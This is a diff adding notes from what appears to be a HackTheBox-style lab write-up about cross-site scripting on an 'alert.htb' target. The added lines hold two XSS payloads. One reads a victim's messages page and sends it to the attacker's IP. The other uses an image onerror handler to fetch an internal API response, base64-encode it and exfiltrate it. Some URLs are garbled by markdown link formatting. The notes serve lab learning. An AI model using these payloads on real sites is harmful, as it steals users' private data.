@@ -64,5 +64,24 @@ Does appear in the development tools:
 
 ![[Pasted image 20241119154106.png]]
 
+Other Examples:
+
+```bash
+<script>
+fetch("http://alert.htb/index.php?page=messages") //User goes to this site
+.then(response => response.text()) // Convert the response to text
+.then(data => {
+fetch("http://10.10.14.180/?data=" + encodeURIComponent(data));
+}) //send the page to the attacker
+.catch(error => console.error("Error fetching the messages:", error));
+</script> 
+```
 
 
+
+```bash
+<img src='[http://10.10.14.180/missing',](http://10.10.14.180/missing',) onerror='fetch(`[http://10.129.133.59/api/info](http://10.129.133.59/api/info)`).then(res => res.text()).then(text => fetch(`[http://10.10.14.180/OK/$](http://10.10.14.180/OK/$){btoa(text)}`)).catch(err => fetch(`[http://10.10.14.180/OK/$](http://10.10.14.180/OK/$){btoa(err)}`))'></img>
+```
+
+On error, go to http://10.129.133.59/api/info
+Take the output and base64 it and send to http://10.10.14.180/OK/$
